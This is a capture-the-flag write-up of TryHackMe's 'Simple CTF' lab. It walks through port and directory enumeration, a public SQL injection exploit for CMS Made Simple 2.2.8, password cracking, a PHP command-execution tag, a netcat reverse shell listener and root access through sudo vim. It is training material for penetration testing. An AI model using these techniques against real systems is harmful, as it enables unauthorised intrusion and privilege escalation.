# TryHackMe – Simple CTF Write-up

## Room Information

* **Platform:** TryHackMe
* **Room:** Simple CTF
* **Difficulty:** Easy
* **Category:** Web Exploitation, Linux Privilege Escalation

---

# Objective

The goal of this room was to gain initial access to the target machine by exploiting a vulnerable CMS Made Simple application, obtain valid user credentials, and escalate privileges to capture both the user and root flags.

---

# Enumeration

I started by performing an Nmap scan to identify the open ports and running services.

```bash
nmap -sC -sV -A -oN nmap.txt <TARGET_IP>
```

### Scan Results

The scan revealed the following interesting services:

| Port | Service |
| ---- | ------- |
| 21   | FTP     |
| 22   | SSH     |
| 80   | HTTP    |

Since the web server was accessible, I continued with web enumeration.

---

# Directory Enumeration

To discover hidden directories, I used Gobuster.

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Gobuster discovered the following directory:

```text
/simple
```

Browsing to `/simple` revealed a **CMS Made Simple** installation.

---

# CMS Version Identification

By viewing the page source and inspecting the application, I identified the CMS version.

```text
CMS Made Simple 2.2.8
```

Identifying the exact version is important because it allows searching for publicly known vulnerabilities.

---

# Finding a Public Exploit

Using Searchsploit, I searched for exploits affecting this CMS version.

```bash
searchsploit "CMS Made Simple 2.2.8"
```

A public exploit targeting this version was available. The exploit performs SQL Injection to extract user information from the CMS database.

The extracted data included:

* Username
* Email Address
* Password Hash

---

# Password Cracking

After obtaining the password hash, I saved it into a file and used John the Ripper with the RockYou wordlist.

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

John successfully cracked the password.

Recovered credentials:

```text
Username : mitch
Password : secret
```

---

# SSH Login

The recovered credentials worked successfully for SSH authentication.

```bash
ssh mitch@<TARGET_IP>
```

After logging in, I verified the current user.

```bash
whoami
```

Output:

```text
mitch
```

---

# User Flag

The user flag was located inside Mitch's home directory.

```bash
cat ~/user.txt
```

The first flag was successfully captured.

---

# Alternative Initial Access (Reverse Shell)

Besides SSH access, I also experimented with authenticated Remote Code Execution through **CMS Made Simple**.

After logging into the CMS Admin Panel, I navigated to:

```text
Extensions
    └── User Defined Tags
```

I created a new tag named **test** and verified code execution with the following PHP payload.

```php
system("id");
```

The application returned:

```text
uid=33(www-data) gid=33(www-data)
```

This confirmed successful command execution as the **www-data** user.

---

# Reverse Shell

After confirming RCE, I replaced the payload with a Bash reverse shell and started a Netcat listener.

Listener:

```bash
rlwrap nc -lvnp 4444
```

Once the payload executed, a reverse shell was received successfully.

---

# Shell Upgrade

To make the reverse shell interactive, I upgraded it using Python.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

On my attacking machine:

```bash
Ctrl + Z
stty raw -echo
fg
```

Back inside the reverse shell:

```bash
export TERM=xterm
```

The shell was now much easier to use for post-exploitation activities.

---

# Switching to Mitch

Using the previously recovered password, I switched from the **www-data** account to the **mitch** user.

```bash
su mitch
```

Password:

```text
secret
```

---

# Privilege Escalation Enumeration

I checked the user's sudo permissions.

```bash
sudo -l
```

Output:

```text
(root) NOPASSWD: /usr/bin/vim
```

This indicated that **mitch** could execute Vim as the root user without entering a password.

---

# Verifying the Vim Binary

Before using GTFOBins, I verified the installed Vim binary.

```bash
which vim
```

Output:

```text
/usr/bin/vim
```

Checking the symbolic link:

```bash
ls -l /etc/alternatives/vim
```

Output:

```text
/usr/bin/vim.basic
```

---

# Privilege Escalation via GTFOBins

Using the GTFOBins technique for Vim, I launched a root shell.

```bash
sudo vim
```

Inside Vim:

```vim
:set shell=/bin/sh
:shell
```

A root shell was successfully spawned.

Verification:

```bash
whoami
```

Output:

```text
root
```

---

# Root Flag

After obtaining root privileges, I navigated to the root directory.

```bash
cd /root
cat root.txt
```

The root flag was successfully captured.

---

# Tools Used

* Nmap
* Gobuster
* Searchsploit
* John the Ripper
* Netcat
* SSH
* Python PTY
* GTFOBins
* Vim

---

# Skills Practiced

* Network Enumeration
* Web Enumeration
* Directory Brute Forcing
* CMS Fingerprinting
* SQL Injection Exploitation
* Password Hash Cracking
* Reverse Shell Handling
* Shell Stabilization
* Linux User Enumeration
* SSH Authentication
* Linux Privilege Escalation
* GTFOBins

---

# Lessons Learned

This room demonstrated the complete penetration testing workflow—from reconnaissance and service enumeration to exploiting a vulnerable web application, cracking password hashes, obtaining remote access, upgrading shells, and finally escalating privileges using an insecure sudo configuration. It reinforced the importance of thorough enumeration, validating exploits before execution, and understanding common Linux privilege escalation techniques such as GTFOBins.
